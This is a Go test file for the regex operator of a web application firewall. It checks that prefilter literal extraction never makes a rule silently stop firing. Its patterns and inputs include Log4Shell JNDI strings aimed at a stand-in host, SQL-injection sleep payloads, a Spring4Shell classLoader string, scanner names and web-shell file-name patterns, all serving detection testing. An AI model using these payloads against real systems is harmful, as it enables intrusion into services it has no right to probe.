// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

package rx_test

import (
	"regexp"
	"strings"
	"testing"

	"github.com/gsoultan/gwaf/rules"
	"github.com/gsoultan/gwaf/rules/op/rx"
	"github.com/gsoultan/gwaf/types"
)

func TestMatchReportsSpan(t *testing.T) {
	t.Parallel()

	o := rx.MustNew(`\$\{jndi:`)
	m, ok := o.Eval(nil, []byte("prefix ${jndi:ldap://x} suffix"))
	if !ok {
		t.Fatal("pattern did not match")
	}
	if m.Span.Off != 7 || m.Span.Len != 7 {
		t.Errorf("span = {off:%d len:%d}, want {off:7 len:7}", m.Span.Off, m.Span.Len)
	}
}

func TestNoMatch(t *testing.T) {
	t.Parallel()

	if _, ok := rx.MustNew(`\$\{jndi:`).Eval(nil, []byte("nothing here")); ok {
		t.Error("pattern matched a value it should not have")
	}
}

func TestNegated(t *testing.T) {
	t.Parallel()

	o, err := rx.NewNegated(`^https://`)
	if err != nil {
		t.Fatalf("NewNegated: %v", err)
	}
	if !o.Negated() {
		t.Error("Negated() is false on a negated operator")
	}
	if _, ok := o.Eval(nil, []byte("http://insecure")); !ok {
		t.Error("negated pattern did not match a value lacking the pattern")
	}
	if _, ok := o.Eval(nil, []byte("https://secure")); ok {
		t.Error("negated pattern matched a value containing the pattern")
	}

	// A negated pattern matches on absence, so no literal can be required.
	if _, required := o.Literals(); required {
		t.Error("a negated pattern claimed required literals, which would let " +
			"the prefilter skip it and silently stop it firing")
	}
}

func TestInvalidPatternIsAnError(t *testing.T) {
	t.Parallel()

	if _, err := rx.New(`(unclosed`); err == nil {
		t.Error("an invalid pattern compiled without error")
	}
	// Backreferences and lookaround are PCRE, not RE2. Rejecting them is the
	// property that makes importing a stranger's regexes safe, so it is
	// asserted rather than assumed.
	for _, pat := range []string{`(a)\1`, `(?=foo)`, `(?<=foo)`} {
		if _, err := rx.New(pat); err == nil {
			t.Errorf("PCRE-only pattern %q compiled; RE2 should reject it", pat)
		}
	}
}

func TestMustNewPanicsOnInvalidPattern(t *testing.T) {
	t.Parallel()

	defer func() {
		if recover() == nil {
			t.Error("MustNew did not panic on an invalid pattern")
		}
	}()
	rx.MustNew(`(unclosed`)
}

func TestCostIsInputIndependent(t *testing.T) {
	t.Parallel()

	o := rx.MustNew(`foo|bar`)
	if o.Cost() <= types.CostLiteralMatch {
		t.Errorf("Cost() = %d, expected more than a literal comparison", o.Cost())
	}
	if o.Cost() != rx.MustNew(`something else entirely`).Cost() {
		t.Error("Cost varies with the pattern; the budget arithmetic assumes it does not")
	}
}

func TestExtractLiterals(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct {
		name    string
		pattern string
		want    []string
	}{
		{"plain literal", `information_schema`, []string{"information_schema"}},
		{"concat around a class", `AKIA[0-9A-Z]{16}`, []string{"akia"}},
		{"alternation, every branch literal", `sleep\(|benchmark\(`,
			[]string{"sleep(", "benchmark("}},
		{"escaped literal run", `\$\{jndi:`, []string{"${jndi:"}},
		{"plus requires its body", `(abcd)+`, []string{"abcd"}},
		{"bounded repeat with min 1", `(abcd){1,3}`, []string{"abcd"}},

		// Regression: the parser factors the shared "ph" prefix out of the
		// alternation, and a mixed conjunctive/disjunctive walk used to return
		// ["tml", "asp"] here — so the rule stopped firing on ".php" with
		// nothing to indicate it.
		{"alternation with a factored common prefix", `\.(php[345]?|phtml|aspx?)$`,
			[]string{".php", ".phtml", ".asp"}},

		// Regression: `py|pl` is factored to `p[ly]`, and refusing to enumerate
		// the class dragged the whole disjunction below the length floor, so a
		// ten-branch extension list extracted nothing and ran on every request.
		{"extension list factored into a character class",
			`\.(exe|php|phtml|sh|py|pl|rb)$`,
			[]string{".exe", ".php", ".phtml", ".sh", ".pl", ".py", ".rb"}},

		// A class too wide to enumerate stays unextracted: 26 automaton entries
		// that between them match nearly every value is a prefilter that costs
		// memory and excludes nothing.
		{"wide character class", `\.(php|[a-z])$`, nil},

		// Regression: a disjunction is only as good as its weakest member, so
		// dropping the short branch would assert that "foo" covers every match.
		// It does not cover "ab", so the whole set has to go.
		{"alternation with a branch below the minimum length", `foo|ab`, nil},

		// Cases that must yield nothing. Each one is a pattern where claiming a
		// literal would make the rule silently stop firing.
		{"alternation with a literal-free branch", `foo|[0-9]+`, nil},
		{"star may match zero times", `(abcd)*`, nil},
		{"optional may match zero times", `(abcd)?`, nil},
		{"repeat with min zero", `(abcd){0,3}`, nil},
		{"character class alone", `[a-z]+`, nil},
		{"literal below the minimum length", `ab`, nil},
		{"invalid pattern", `(unclosed`, nil},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			got := rx.ExtractLiterals(tc.pattern)
			if len(got) != len(tc.want) {
				t.Fatalf("ExtractLiterals(%q) = %q, want %q", tc.pattern, got, tc.want)
			}
			for i := range got {
				if got[i] != tc.want[i] {
					t.Errorf("ExtractLiterals(%q)[%d] = %q, want %q",
						tc.pattern, i, got[i], tc.want[i])
				}
			}
		})
	}
}

// TestLiteralsAreSound is the test that matters most in this package.
//
// Literals() is an assertion the compiler cannot check: the engine skips a rule
// entirely when none of its literals appear, so a literal that is not genuinely
// required makes the rule silently stop firing. That is the single failure mode
// in the Operator contract that produces no error, no log line and no report —
// it just quietly stops blocking attacks.
//
// So for every pattern, every string the pattern matches must contain at least
// one declared literal. The prefilter folds ASCII case on both sides, so the
// containment check folds too.
func TestLiteralsAreSound(t *testing.T) {
	t.Parallel()

	patterns := []string{
		`\$\{jndi:(?:ldap|rmi|dns):`,
		`AKIA[0-9A-Z]{16}`,
		`sleep\(|benchmark\(|pg_sleep\(`,
		`(?i)(nikto|sqlmap|acunetix)`,
		`\.(php[345]?|phtml|aspx?)$`,
		`information_schema\.|sys\.tables|@@version`,
		`ghp_[a-zA-Z0-9]{36}`,
		`class\.module\.classLoader`,
		`(?:#|\$)\{.*\}`,
		`\b4[0-9]{12}(?:[0-9]{3})?\b`,
		`\.(exe|php|phtml|sh|py|pl|rb|jsp|asp|aspx)$`,
		`\b(shell|cmd|sh|bash|nc|backdoor)\.(php|asp|jsp|sh|py|pl)\b`,
		`foo|[0-9]+`, // no literals: must report unconditional, never a false one
		`[a-z]+`,
	}

	// Inputs deliberately mix matching payloads, near-misses and noise.
	inputs := []string{
		"", "x", "hello world",
		"${jndi:ldap://evil.example/a}", "${jndi:dns://x}", "${JNDI:RMI://x}",
		"AKIAIOSFODNN7EXAMPLE", "akiaiosfodnn7example", "AKIA123",
		"1 and sleep(5)", "BENCHMARK(1000,1)", "pg_sleep(10)", "asleep",
		"sqlmap/1.7", "SQLMap", "Nikto/2.5", "Mozilla/5.0",
		"/upload/evil.php", "/x.phtml", "/x.aspx", "/x.txt",
		"a.py", "a.pl", "a.rb", "a.sh", "a.jsp", "x.exe", "shell.php", "cmd.sh",
		"information_schema.tables", "SYS.TABLES", "@@VERSION",
		"ghp_abcdefghijklmnopqrstuvwxyz0123456789",
		"class.module.classLoader.x", "CLASS.MODULE.CLASSLOADER",
		"#{7*7}", "${x}", "no braces",
		"4111111111111111", "1234", "411111111111111111111",
		"123", "abc", "ABC",
	}

	for _, pat := range patterns {
		o, err := rx.New(pat)
		if err != nil {
			t.Fatalf("New(%q): %v", pat, err)
		}
		lits, required := o.Literals()
		if !required {
			continue // unconditional: no assertion to violate
		}
		re := regexp.MustCompile(pat)

		for _, in := range inputs {
			if !re.MatchString(in) {
				continue
			}
			if !containsAnyFold(in, lits) {
				t.Errorf("pattern %q matches %q but declares literals %q, none of "+
					"which appear in it; the prefilter would skip this rule and it "+
					"would silently stop firing", pat, in, lits)
			}
		}
	}
}

// FuzzLiteralsAreSound extends the property above to inputs nobody thought of.
func FuzzLiteralsAreSound(f *testing.F) {
	for _, s := range []string{
		"${jndi:ldap://x}", "AKIAIOSFODNN7EXAMPLE", "sleep(1)",
		"/a.php", "information_schema.x", "#{1}", "4111111111111111",
	} {
		f.Add(s)
	}

	patterns := []string{
		`\$\{jndi:(?:ldap|rmi|dns):`,
		`AKIA[0-9A-Z]{16}`,
		`sleep\(|benchmark\(|pg_sleep\(`,
		`\.(php[345]?|phtml|aspx?)$`,
		`information_schema\.|sys\.tables|@@version`,
		`(?:#|\$)\{.*\}`,
		`\.(exe|php|phtml|sh|py|pl|rb|jsp|asp|aspx)$`,
	}
	compiled := make([]*regexp.Regexp, len(patterns))
	ops := make([]*rx.Operator, len(patterns))
	for i, p := range patterns {
		compiled[i] = regexp.MustCompile(p)
		ops[i] = rx.MustNew(p)
	}

	f.Fuzz(func(t *testing.T, in string) {
		for i := range patterns {
			lits, required := ops[i].Literals()
			if !required || !compiled[i].MatchString(in) {
				continue
			}
			if !containsAnyFold(in, lits) {
				t.Fatalf("pattern %q matches %q but none of its literals %q appear",
					patterns[i], in, lits)
			}
		}
	})
}

// containsAnyFold reports whether s contains any of the literals, folding ASCII
// case the way the prefilter automaton does.
func containsAnyFold(s string, lits []string) bool {
	low := strings.ToLower(s)
	for _, l := range lits {
		if strings.Contains(low, strings.ToLower(l)) {
			return true
		}
	}
	return false
}

// TestOperatorSatisfiesTheInterface pins the contract this package exists to
// implement.
func TestOperatorSatisfiesTheInterface(t *testing.T) {
	t.Parallel()

	var o rules.Operator = rx.MustNew(`foo`)
	if o.Name() != "rx" {
		t.Errorf("Name() = %q, want %q", o.Name(), "rx")
	}
	if rx.MustNew(`foobar`).Pattern() != "foobar" {
		t.Error("Pattern() did not round-trip the source pattern")
	}
}
